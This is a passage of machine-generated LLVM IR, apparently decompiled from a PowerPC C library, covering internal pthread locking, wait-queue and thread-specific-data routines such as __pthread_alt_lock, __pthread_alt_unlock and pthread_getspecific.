  %v0_10017e90.pre.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10017e94.pre.pre = load i32, i32* %r30.global-to-local, align 4
  %v1_10017eb4.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10017e90.outer

dec_label_pc_10017e90.outer:                      ; preds = %dec_label_pc_10017e44, %dec_label_pc_10017e7c
  %v0_10017ed0.pr14.ph = phi i32 [ 1, %dec_label_pc_10017e7c ], [ %v0_10017ed0.pr16, %dec_label_pc_10017e44 ]
  %v1_10017eb4.ph = phi i32 [ %v1_10017eb4.pre.pre, %dec_label_pc_10017e7c ], [ %v1_10017e4c, %dec_label_pc_10017e44 ]
  %v0_10017eb0.ph = phi i32 [ %v0_10017e94.pre.pre, %dec_label_pc_10017e7c ], [ 0, %dec_label_pc_10017e44 ]
  %v0_10017eac.ph = phi i32 [ %v0_10017e90.pre.pre, %dec_label_pc_10017e7c ], [ %v0_10017e44, %dec_label_pc_10017e44 ]
  %v1_10017e90 = mul i32 %v0_10017eac.ph, 32
  %v1_10017eac = mul i32 %v0_10017eac.ph, 4
  %v2_10017eb4 = add i32 %v1_10017eac, %v1_10017eb4.ph
  %v1_10017e64 = add i32 %v2_10017eb4, 236
  %v2_10017e64 = inttoptr i32 %v1_10017e64 to i32*
  br label %dec_label_pc_10017e90

dec_label_pc_10017e90:                            ; preds = %dec_label_pc_10017e90.outer, %dec_label_pc_10017e60
  %v0_10017eb0 = phi i32 [ %v1_10017eb8, %dec_label_pc_10017e60 ], [ %v0_10017eb0.ph, %dec_label_pc_10017e90.outer ]
  %v1_10017eb0 = mul i32 %v0_10017eb0, 4
  store i32 %v1_10017eb0, i32* @r10, align 4
  %v1_10017eb8 = add i32 %v0_10017eb0, 1
  store i32 %v1_10017eb8, i32* %r30.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10017eb0, 32
  br i1 %tmp20, label %dec_label_pc_10017e60, label %dec_label_pc_10017ec0.loopexit

dec_label_pc_10017ec0.loopexit:                   ; preds = %dec_label_pc_10017e90
  br label %dec_label_pc_10017ec0

dec_label_pc_10017ec0:                            ; preds = %dec_label_pc_10017ec0.loopexit, %dec_label_pc_10017e44
  %v0_10017ed0.pr = phi i32 [ %v0_10017ed0.pr16, %dec_label_pc_10017e44 ], [ %v0_10017ed0.pr14.ph, %dec_label_pc_10017ec0.loopexit ]
  %v0_10017ec0 = phi i32 [ %v0_10017e44, %dec_label_pc_10017e44 ], [ %v0_10017eac.ph, %dec_label_pc_10017ec0.loopexit ]
  %v1_10017e4c4 = phi i32 [ %v1_10017e4c, %dec_label_pc_10017e44 ], [ %v1_10017eb4.ph, %dec_label_pc_10017ec0.loopexit ]
  %v1_10017ec0 = add i32 %v0_10017ec0, 1
  store i32 %v1_10017ec0, i32* %r31.global-to-local, align 4
  %tmp21 = icmp slt i32 %v1_10017ec0, 32
  br i1 %tmp21, label %dec_label_pc_10017e44, label %dec_label_pc_10017ecc

dec_label_pc_10017ecc:                            ; preds = %dec_label_pc_10017ec0
  %v0_10017ecc = load i32, i32* %r28.global-to-local, align 4
  %v1_10017ecc = add i32 %v0_10017ecc, 1
  store i32 %v1_10017ecc, i32* %r28.global-to-local, align 4
  %v3_10017ed0 = icmp eq i32 %v0_10017ed0.pr, 0
  br i1 %v3_10017ed0, label %dec_label_pc_10017eec, label %dec_label_pc_10017ed8

dec_label_pc_10017ed8:                            ; preds = %entry, %dec_label_pc_10017ecc
  %v1_10017e4c3 = phi i32 [ %v0_10017e34, %entry ], [ %v1_10017e4c4, %dec_label_pc_10017ecc ]
  %v0_10017ed8 = phi i32 [ 0, %entry ], [ %v1_10017ecc, %dec_label_pc_10017ecc ]
  %v2_10017ed8 = icmp sgt i32 %v0_10017ed8, 3
  br i1 %v2_10017ed8, label %dec_label_pc_10017eec, label %dec_label_pc_10017ee0

dec_label_pc_10017ee0:                            ; preds = %dec_label_pc_10017ed8
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10017e44

dec_label_pc_10017eec:                            ; preds = %dec_label_pc_10017ed8, %dec_label_pc_10017ecc
  %v0_10017eec = phi i32 [ %v1_10017e4c3, %dec_label_pc_10017ed8 ], [ %v1_10017e4c4, %dec_label_pc_10017ecc ]
  %v1_10017eec = add i32 %v0_10017eec, 28
  %v2_10017eec = inttoptr i32 %v1_10017eec to i32*
  %v3_10017eec = load i32, i32* %v2_10017eec, align 4
  store i32 %v3_10017eec, i32* @r3, align 4
  store i32 %v0_10017eec, i32* @r4, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10017efc.1116 to i32), i32* @lr, align 4
  %v0_10017ef8 = call i32 @__pthread_lock()
  br label %dec_label_pc_10017f1c

dec_label_pc_10017f00:                            ; preds = %dec_label_pc_10017f1c
  %v1_10017f00 = add i32 %v2_10017f24, 236
  %v2_10017f00 = inttoptr i32 %v1_10017f00 to i32*
  %v3_10017f00 = load i32, i32* %v2_10017f00, align 4
  %v3_10017f04 = icmp eq i32 %v3_10017f00, 0
  store i32 %v3_10017f00, i32* @r3, align 4
  br i1 %v3_10017f04, label %dec_label_pc_10017f1c, label %dec_label_pc_10017f10

dec_label_pc_10017f10:                            ; preds = %dec_label_pc_10017f00
  store i32 ptrtoint (i32* @global_var_10017f14.1117 to i32), i32* @lr, align 4
  %v0_10017f10 = call i32 @free()
  %v1_10017f18 = load i32, i32* @r30, align 4
  %v2_10017f18 = add i32 %v1_10017f18, 12
  %v3_10017f18 = inttoptr i32 %v2_10017f18 to i32*
  store i32 0, i32* %v3_10017f18, align 4
  br label %dec_label_pc_10017f1c

dec_label_pc_10017f1c:                            ; preds = %dec_label_pc_10017f00, %dec_label_pc_10017f10, %dec_label_pc_10017eec
  %v0_10017f1c = load i32, i32* @r31, align 4
  %v1_10017f20 = mul i32 %v0_10017f1c, 4
  %v1_10017f24 = load i32, i32* @r29, align 4
  %v2_10017f24 = add i32 %v1_10017f24, %v1_10017f20
  %v1_10017f28 = add i32 %v0_10017f1c, 1
  store i32 %v1_10017f28, i32* @r31, align 4
  %v1_10017f2c = add i32 %v2_10017f24, 224
  store i32 %v1_10017f2c, i32* @r30, align 4
  %tmp22 = icmp slt i32 %v0_10017f1c, 32
  br i1 %tmp22, label %dec_label_pc_10017f00, label %dec_label_pc_10017f34

dec_label_pc_10017f34:                            ; preds = %dec_label_pc_10017f1c
  %v1_10017f34 = add i32 %v1_10017f24, 28
  %v2_10017f34 = inttoptr i32 %v1_10017f34 to i32*
  %v3_10017f34 = load i32, i32* %v2_10017f34, align 4
  store i32 %v3_10017f34, i32* @r3, align 4
  store i32 268533564, i32* @lr, align 4
  %v0_10017f38 = call i32 @__pthread_unlock()
  ret i32 %v0_10017f38

; uselistorder directives
  uselistorder i32 %v2_10017f24, { 1, 0 }
  uselistorder i32 %v0_10017f1c, { 1, 2, 0 }
  uselistorder i32 %v0_10017eec, { 1, 0 }
  uselistorder i32 %v1_10017ec0, { 1, 2, 0 }
  uselistorder i32 %v1_10017eb8, { 1, 0 }
  uselistorder i32 %v0_10017eb0, { 2, 3, 0, 1 }
  uselistorder i32 %v0_10017eac.ph, { 1, 0, 2 }
  uselistorder i32 %v0_10017e44, { 2, 1, 0 }
  uselistorder i32 %v1_10017e4c, { 2, 0, 1 }
  uselistorder i32 %v0_10017ed0.pr16, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r28.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @__pthread_unlock, { 8, 10, 9, 43, 42, 41, 40, 39, 38, 37, 46, 36, 34, 33, 35, 0, 32, 47, 31, 45, 30, 29, 28, 27, 26, 7, 6, 4, 3, 2, 1, 5, 25, 44, 12, 24, 23, 13, 11, 22, 21, 20, 19, 18, 17, 16, 15, 14 }
  uselistorder i32 224, { 2, 0, 1 }
  uselistorder i32 ()* @__pthread_lock, { 6, 10, 29, 28, 27, 32, 25, 24, 26, 23, 22, 1, 0, 21, 33, 20, 31, 19, 18, 5, 3, 2, 4, 17, 30, 8, 16, 15, 9, 7, 14, 13, 12, 11 }
  uselistorder label %dec_label_pc_10017f1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10017ed8, { 1, 0 }
  uselistorder label %dec_label_pc_10017e90.outer, { 1, 0 }
}

define i32 @pthread_getspecific(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %v2_10017f50 = icmp ugt i32 %arg1, 1023
  %v1_10017f54 = call i32 @__asm_rlwinm(i32 %arg1, i32 29, i32 3, i32 29)
  store i32 %v1_10017f54, i32* %r0.global-to-local, align 4
  %v1_10017f58 = load i32, i32* @r2, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br i1 %v2_10017f50, label %dec_label_pc_10017f90, label %dec_label_pc_10017f64

dec_label_pc_10017f64:                            ; preds = %entry
  %v2_10017f58 = add i32 %v1_10017f58, %v1_10017f54
  %v1_10017f64 = add i32 %v2_10017f58, 236
  %v2_10017f64 = inttoptr i32 %v1_10017f64 to i32*
  %v3_10017f64 = load i32, i32* %v2_10017f64, align 4
  store i32 %v3_10017f64, i32* %r11.global-to-local, align 4
  %v1_10017f68 = mul i32 %arg1, 8
  store i32 %v1_10017f68, i32* %r0.global-to-local, align 4
  %v3_10017f6c = icmp eq i32 %v3_10017f64, 0
  br i1 %v3_10017f6c, label %dec_label_pc_10017f90, label %dec_label_pc_10017f74

dec_label_pc_10017f74:                            ; preds = %dec_label_pc_10017f64
  %v1_10017f78 = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v1_10017f80 = load i32, i32* %r0.global-to-local, align 4
  %v2_10017f80 = add i32 %v1_10017f80, ptrtoint (i32* @global_var_10049814.1106 to i32)
  %v3_10017f80 = inttoptr i32 %v2_10017f80 to i32*
  %v4_10017f80 = load i32, i32* %v3_10017f80, align 4
  store i32 %v4_10017f80, i32* %r0.global-to-local, align 4
  %v3_10017f84 = icmp eq i32 %v4_10017f80, 0
  br i1 %v3_10017f84, label %dec_label_pc_10017f74.dec_label_pc_10017f90_crit_edge, label %dec_label_pc_10017f8c

dec_label_pc_10017f74.dec_label_pc_10017f90_crit_edge: ; preds = %dec_label_pc_10017f74
  %v0_10017f90.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10017f90

dec_label_pc_10017f8c:                            ; preds = %dec_label_pc_10017f74
  %v1_10017f8c = load i32, i32* %r11.global-to-local, align 4
  %v2_10017f8c = add i32 %v1_10017f8c, %v1_10017f78
  %v3_10017f8c = inttoptr i32 %v2_10017f8c to i32*
  %v4_10017f8c = load i32, i32* %v3_10017f8c, align 4
  store i32 %v4_10017f8c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10017f90

dec_label_pc_10017f90:                            ; preds = %dec_label_pc_10017f74.dec_label_pc_10017f90_crit_edge, %dec_label_pc_10017f64, %entry, %dec_label_pc_10017f8c
  %v0_10017f90 = phi i32 [ %v0_10017f90.pre, %dec_label_pc_10017f74.dec_label_pc_10017f90_crit_edge ], [ 0, %dec_label_pc_10017f64 ], [ 0, %entry ], [ %v4_10017f8c, %dec_label_pc_10017f8c ]
  ret i32 %v0_10017f90

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_10049814.1106 to i32), { 4, 1, 5, 6, 8, 0, 2, 3, 7 }
  uselistorder i32 236, { 2, 1, 5, 6, 3, 4, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10017f90, { 3, 0, 1, 2 }
}

define i32 @wait_node_dequeue(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v4_10017f98 = icmp eq i32 %tmp, %arg1
  %v1_10017fa0 = inttoptr i32 %arg3 to i32*
  br i1 %v4_10017f98, label %dec_label_pc_10017fa4, label %dec_label_pc_10017fdc

dec_label_pc_10017fa4:                            ; preds = %entry
  %r9.promoted = load i32, i32* @r9, align 4
  %v5_10017fa8 = icmp eq i32 %r9.promoted, %arg3
  %v0_10017fc0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v5_10017fa8, i32 %v0_10017fc0)
  %v0_10017fd01 = load i32, i32* %r4.global-to-local, align 4
  %v1_10017fd02 = inttoptr i32 %v0_10017fd01 to i32*
  %v2_10017fd03 = load i32, i32* %v1_10017fd02, align 4
  %v4_10017fd46 = icmp eq i32 %v2_10017fd03, %arg3
  br i1 %v4_10017fd46, label %dec_label_pc_10017fdc, label %dec_label_pc_10017fc8

dec_label_pc_10017fc8:                            ; preds = %dec_label_pc_10017fa4, %dec_label_pc_10017fc8
  %v0_10017fc8 = phi i32 [ %v2_10017fd0, %dec_label_pc_10017fc8 ], [ %v2_10017fd03, %dec_label_pc_10017fa4 ]
  store i32 %v0_10017fc8, i32* %r4.global-to-local, align 4
  %v1_10017fd0 = inttoptr i32 %v0_10017fc8 to i32*
  %v2_10017fd0 = load i32, i32* %v1_10017fd0, align 4
  %v4_10017fd4 = icmp eq i32 %v2_10017fd0, %arg3
  br i1 %v4_10017fd4, label %dec_label_pc_10017fd0.dec_label_pc_10017fdc.loopexit_crit_edge, label %dec_label_pc_10017fc8

dec_label_pc_10017fd0.dec_label_pc_10017fdc.loopexit_crit_edge: ; preds = %dec_label_pc_10017fc8
  br label %dec_label_pc_10017fdc

dec_label_pc_10017fdc:                            ; preds = %entry, %dec_label_pc_10017fa4, %dec_label_pc_10017fd0.dec_label_pc_10017fdc.loopexit_crit_edge
  %v1_10017fe0 = phi i32 [ %v0_10017fc8, %dec_label_pc_10017fd0.dec_label_pc_10017fdc.loopexit_crit_edge ], [ %v0_10017fd01, %dec_label_pc_10017fa4 ], [ %tmp, %entry ]
  %v2_10017fdc = load i32, i32* %v1_10017fa0, align 4
  %v2_10017fe0 = inttoptr i32 %v1_10017fe0 to i32*
  store i32 %v2_10017fdc, i32* %v2_10017fe0, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v2_10017fd0, { 1, 0 }
  uselistorder i32 %v0_10017fc8, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10017fdc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10017fc8, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10017ff4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10017ff4, i32* @r30, align 4
  store i32 0, i32* @r31, align 4
  %v2_10018014 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_10018040

dec_label_pc_10018008:                            ; preds = %dec_label_pc_10018040
  %v2_1001805c = icmp sgt i32 %v0_1001805c, 49
  %v1_1001800c = add i32 %v0_1001805c, 1
  store i32 %v1_1001800c, i32* @r31, align 4
  store i32 %v2_10018014, i32* %r3.global-to-local, align 4
  br i1 %v2_1001805c, label %dec_label_pc_10018028, label %dec_label_pc_10018020

dec_label_pc_10018020:                            ; preds = %dec_label_pc_10018008
  store i32 ptrtoint (i32* @global_var_10018024.1118 to i32), i32* @lr, align 4
  %v2_10018020 = call i32 @sched_yield(i32 %v2_10018014, i32 0)
  br label %dec_label_pc_10018038.backedge

dec_label_pc_10018028:                            ; preds = %dec_label_pc_10018008
  store i32 0, i32* %stack_var_-24, align 4
  store i32 0, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10018038.1119 to i32), i32* @lr, align 4
  %v2_10018034 = call i32 @nanosleep(i32 %v2_10018014, i32 0)
  br label %dec_label_pc_10018038.backedge

dec_label_pc_10018038.backedge:                   ; preds = %dec_label_pc_10018028, %dec_label_pc_10018020
  %storemerge = phi i32 [ %v2_10018020, %dec_label_pc_10018020 ], [ %v2_10018034, %dec_label_pc_10018028 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_1001805c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10018040

dec_label_pc_10018040:                            ; preds = %entry, %dec_label_pc_10018038.backedge
  %v0_1001805c = phi i32 [ %v0_1001805c.pre, %dec_label_pc_10018038.backedge ], [ 0, %entry ]
  %v0_10018074 = phi i32 [ %storemerge, %dec_label_pc_10018038.backedge ], [ %v0_10017ff4, %entry ]
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_10018044 = icmp eq i32 %r11.promoted, 0
  br i1 %v5_10018044, label %dec_label_pc_10018064, label %dec_label_pc_10018008

dec_label_pc_10018064:                            ; preds = %dec_label_pc_10018040
  ret i32 %v0_10018074

; uselistorder directives
  uselistorder i32 %v2_10018014, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 1 }
  uselistorder i32 49, { 1, 0 }
  uselistorder label %dec_label_pc_10018040, { 1, 0 }
}

define i32 @wait_node_free(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 268697600, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 268533912, i32* @lr, align 4
  %v1_10018094 = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_10045228.1120 to i32))
  store i32 268697600, i32* @r9, align 4
  %v3_1001809c = load i32, i32* @global_var_10045224.1121, align 4
  %v1_100180a0 = load i32, i32* @r28, align 4
  %v2_100180a0 = inttoptr i32 %v1_100180a0 to i32*
  store i32 %v3_1001809c, i32* %v2_100180a0, align 4
  %v0_100180a4 = load i32, i32* @r28, align 4
  store i32 %v0_100180a4, i32* @global_var_10045224.1121, align 4
  store i32 0, i32* @global_var_10045228.1120, align 4
  ret i32 %v1_10018094
}

define i32 @restart.9(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268533980, i32* @lr, align 4
  %v0_100180d8 = call i32 @__pthread_restart_new()
  ret i32 %v0_100180d8

; uselistorder directives
  uselistorder i32 ()* @__pthread_restart_new, { 0, 5, 4, 1, 2, 3 }
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_100180ec = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  br label %dec_label_pc_10018104.outer

dec_label_pc_10018104.outer:                      ; preds = %dec_label_pc_100181cc, %dec_label_pc_100181b8, %entry
  %v0_100181b07.ph = phi i32 [ %tmp, %entry ], [ %v0_100181b0, %dec_label_pc_100181b8 ], [ %v0_100181b0, %dec_label_pc_100181cc ]
  %v1_10018104 = inttoptr i32 %v0_100181b07.ph to i32*
  br label %dec_label_pc_10018104

dec_label_pc_10018104:                            ; preds = %dec_label_pc_10018104.outer, %dec_label_pc_10018118
  %v2_10018104 = load i32, i32* %v1_10018104, align 4
  %v2_10018108 = icmp ugt i32 %v2_10018104, 1
  br i1 %v2_10018108, label %dec_label_pc_10018154.lr.ph, label %dec_label_pc_10018118

dec_label_pc_10018118:                            ; preds = %dec_label_pc_10018104
  %r9.promoted = load i32, i32* @r9, align 4
  %.pre = xor i32 %r9.promoted, %v2_10018104
  %v5_1001811c = icmp eq i32 %.pre, 0
  store i32 %.pre, i32* @r9, align 4
  br i1 %v5_1001811c, label %dec_label_pc_10018210.loopexit, label %dec_label_pc_10018104

dec_label_pc_10018154.lr.ph:                      ; preds = %dec_label_pc_10018104
  store i32 %v2_10018104, i32* @r31, align 4
  store i32 -2147483648, i32* @r27, align 4
  store i32 %v2_10018104, i32* @r28, align 4
  store i32 %v0_100181b07.ph, i32* @r26, align 4
  br label %dec_label_pc_10018154

dec_label_pc_10018154:                            ; preds = %dec_label_pc_10018154.lr.ph, %dec_label_pc_100181a4.backedge
  %v0_10018194 = phi i32 [ %v0_100181b07.ph, %dec_label_pc_10018154.lr.ph ], [ %v0_100181ac, %dec_label_pc_100181a4.backedge ]
  %v0_100181b011 = phi i32 [ %v0_100181b07.ph, %dec_label_pc_10018154.lr.ph ], [ %v0_100181b0, %dec_label_pc_100181a4.backedge ]
  %v0_1001819c = phi i32 [ %v2_10018104, %dec_label_pc_10018154.lr.ph ], [ %storemerge, %dec_label_pc_100181a4.backedge ]
  %v1_10018154 = add i32 %v0_1001819c, 8
  %v2_10018154 = inttoptr i32 %v1_10018154 to i32*
  %v3_10018154 = load i32, i32* %v2_10018154, align 4
  %v3_10018158 = icmp eq i32 %v3_10018154, 0
  br i1 %v3_10018158, label %dec_label_pc_10018180, label %dec_label_pc_10018160

dec_label_pc_10018160:                            ; preds = %dec_label_pc_10018154
  store i32 268534116, i32* @lr, align 4
  %v3_10018160 = inttoptr i32 %v0_10018194 to i32*
  %v4_10018160 = call i32 @wait_node_dequeue(i32 %v0_100181b011, i32* %v3_10018160, i32 %v0_1001819c)
  %v0_10018164 = load i32, i32* @r31, align 4
  store i32 268534124, i32* @lr, align 4
  %v1_10018168 = inttoptr i32 %v0_10018164 to i32*
  %v2_10018168 = call i32 @wait_node_free(i32* %v1_10018168)
  %v0_1001816c = load i32, i32* @r29, align 4
  %v1_1001816c = load i32, i32* @r30, align 4
  br label %dec_label_pc_100181a4.backedge

dec_label_pc_10018180:                            ; preds = %dec_label_pc_10018154
  %v1_10018180 = add i32 %v0_1001819c, 4
  %v2_10018180 = inttoptr i32 %v1_10018180 to i32*
  %v3_10018180 = load i32, i32* %v2_10018180, align 4
  store i32 %v3_10018180, i32* @r9, align 4
  %v1_10018184 = add i32 %v3_10018180, 24
  %v2_10018184 = inttoptr i32 %v1_10018184 to i32*
  %v3_10018184 = load i32, i32* %v2_10018184, align 4
  %v1_10018188 = load i32, i32* @r27, align 4
  %v2_10018188 = icmp slt i32 %v3_10018184, %v1_10018188
  br i1 %v2_10018188, label %dec_label_pc_1001819c, label %dec_label_pc_10018190

dec_label_pc_10018190:                            ; preds = %dec_label_pc_10018180
  store i32 %v3_10018184, i32* @r27, align 4
  store i32 %v0_10018194, i32* @r26, align 4
  store i32 %v0_1001819c, i32* @r28, align 4
  br label %dec_label_pc_1001819c

dec_label_pc_1001819c:                            ; preds = %dec_label_pc_10018180, %dec_label_pc_10018190
  store i32 %v0_1001819c, i32* @r29, align 4
  br label %dec_label_pc_100181a4.backedge

dec_label_pc_100181a4.backedge:                   ; preds = %dec_label_pc_1001819c, %dec_label_pc_10018160
  %v0_100181b0 = phi i32 [ %v1_1001816c, %dec_label_pc_10018160 ], [ %v0_100181b011, %dec_label_pc_1001819c ]
  %v0_100181ac = phi i32 [ %v0_1001816c, %dec_label_pc_10018160 ], [ %v0_1001819c, %dec_label_pc_1001819c ]
  %storemerge.in = inttoptr i32 %v0_100181ac to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r31, align 4
  %v3_100181a4 = icmp eq i32 %storemerge, 1
  br i1 %v3_100181a4, label %dec_label_pc_100181b8, label %dec_label_pc_10018154

dec_label_pc_100181b8:                            ; preds = %dec_label_pc_100181a4.backedge
  %v0_100181bc.pre = load i32, i32* @r27, align 4
  %v4_100181bc = icmp eq i32 %v0_100181bc.pre, -2147483648
  br i1 %v4_100181bc, label %dec_label_pc_10018104.outer, label %dec_label_pc_100181cc

dec_label_pc_100181cc:                            ; preds = %dec_label_pc_100181b8
  %v0_100181c4 = load i32, i32* @r28, align 4
  %v1_100181c4 = add i32 %v0_100181c4, 8
  store i32 %v1_100181c4, i32* @r9, align 4
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_100181d0 = icmp eq i32 %r11.promoted, 0
  br i1 %v5_100181d0, label %dec_label_pc_100181ec, label %dec_label_pc_10018104.outer

dec_label_pc_100181ec:                            ; preds = %dec_label_pc_100181cc
  %v0_100181ec = load i32, i32* @r26, align 4
  store i32 268534264, i32* @lr, align 4
  %v3_100181f4 = inttoptr i32 %v0_100181c4 to i32*
  %v4_100181f4 = call i32 @wait_node_dequeue(i32 %v0_100181ec, i32* %v3_100181f4, i32 %v0_100181c4)
  %v0_100181f8 = load i32, i32* @r28, align 4
  %v1_100181f8 = add i32 %v0_100181f8, 4
  %v2_100181f8 = inttoptr i32 %v1_100181f8 to i32*
  %v3_100181f8 = load i32, i32* %v2_100181f8, align 4
  store i32 %v3_100181f8, i32* @r3, align 4
  store i32 %v0_100180ec, i32* @lr, align 4
  %v1_1001820c = call i32 @restart.9(i32 %v3_100181f8)
  br label %dec_label_pc_10018210

dec_label_pc_10018210.loopexit:                   ; preds = %dec_label_pc_10018118
  br label %dec_label_pc_10018210

dec_label_pc_10018210:                            ; preds = %dec_label_pc_10018210.loopexit, %dec_label_pc_100181ec
  %v0_10018220 = phi i32 [ %v1_1001820c, %dec_label_pc_100181ec ], [ %v2_10018104, %dec_label_pc_10018210.loopexit ]
  ret i32 %v0_10018220

; uselistorder directives
  uselistorder i32 %v0_100181c4, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_100181ac, { 1, 0 }
  uselistorder i32 %v0_100181b0, { 1, 0, 2 }
  uselistorder i32 %v0_1001819c, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v2_10018104, { 3, 0, 2, 1, 4, 5 }
  uselistorder i32 %v0_100181b07.ph, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1001819c, { 1, 0 }
  uselistorder label %dec_label_pc_10018154, { 1, 0 }
  uselistorder label %dec_label_pc_10018104, { 1, 0 }
}

define i32 @suspend.10() local_unnamed_addr {
entry:
  store i32 268534324, i32* @lr, align 4
  %v0_10018230 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10018230

; uselistorder directives
  uselistorder i32 ()* @__pthread_wait_for_restart_signal, { 0, 4, 5, 1, 2, 3, 6 }
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r11, align 4
  store i32 0, i32* @r10, align 4
  store i32 %arg2, i32* @r3, align 4
  br label %dec_label_pc_1001825c

dec_label_pc_1001825c:                            ; preds = %dec_label_pc_100182a0, %entry
  %v0_10018260 = phi i32 [ %v0_100182604, %dec_label_pc_100182a0 ], [ %arg2, %entry ]
  %v2_1001825c = load i32, i32* %arg1, align 4
  store i32 %v2_1001825c, i32* @r9, align 4
  %v3_10018268 = icmp eq i32 %v2_1001825c, 0
  br i1 %v3_10018268, label %dec_label_pc_1001828c, label %dec_label_pc_10018270

dec_label_pc_10018270:                            ; preds = %dec_label_pc_1001825c
  %v3_10018260 = icmp eq i32 %v0_10018260, 0
  br i1 %v3_10018260, label %dec_label_pc_10018274, label %dec_label_pc_10018278

dec_label_pc_10018274:                            ; preds = %dec_label_pc_10018270
  %v0_10018274 = load i32, i32* @r2, align 4
  store i32 %v0_10018274, i32* @r3, align 4
  br label %dec_label_pc_10018278

dec_label_pc_10018278:                            ; preds = %dec_label_pc_10018270, %dec_label_pc_10018274
  %v0_100182603 = phi i32 [ %v0_10018260, %dec_label_pc_10018270 ], [ %v0_10018274, %dec_label_pc_10018274 ]
  br label %dec_label_pc_1001828c

dec_label_pc_1001828c:                            ; preds = %dec_label_pc_10018278, %dec_label_pc_1001825c
  %v0_100182604 = phi i32 [ %v0_10018260, %dec_label_pc_1001825c ], [ %v0_100182603, %dec_label_pc_10018278 ]
  %r8.promoted = load i32, i32* @r8, align 4
  %.pre = xor i32 %r8.promoted, %v2_1001825c
  %v5_10018290 = icmp eq i32 %.pre, 0
  br i1 %v5_10018290, label %dec_label_pc_100182ac, label %dec_label_pc_100182a0

dec_label_pc_100182a0:                            ; preds = %dec_label_pc_1001828c
  store i32 %.pre, i32* @r8, align 4
  br label %dec_label_pc_1001825c

dec_label_pc_100182ac:                            ; preds = %dec_label_pc_1001828c
  store i32 0, i32* @r8, align 4
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10018268, label %dec_label_pc_100182b8, label %dec_label_pc_100182b4

dec_label_pc_100182b4:                            ; preds = %dec_label_pc_100182ac
  store i32 ptrtoint (i32* @global_var_100182b8.1122 to i32), i32* @lr, align 4
  %v0_100182b4 = call i32 @suspend.10()
  br label %dec_label_pc_100182b8

dec_label_pc_100182b8:                            ; preds = %dec_label_pc_100182ac, %dec_label_pc_100182b4
  %v0_100182c8 = phi i32 [ %v0_100182604, %dec_label_pc_100182ac ], [ %v0_100182b4, %dec_label_pc_100182b4 ]
  ret i32 %v0_100182c8

; uselistorder directives
  uselistorder i32 %v0_10018260, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100182b8, { 1, 0 }
  uselistorder label %dec_label_pc_10018278, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_100182d0 = load i32, i32* @lr, align 4
  store i32 %v0_100182d0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 268534516, i32* @lr, align 4
  %v1_100182f0 = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_10045228.1120 to i32))
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r31, align 4
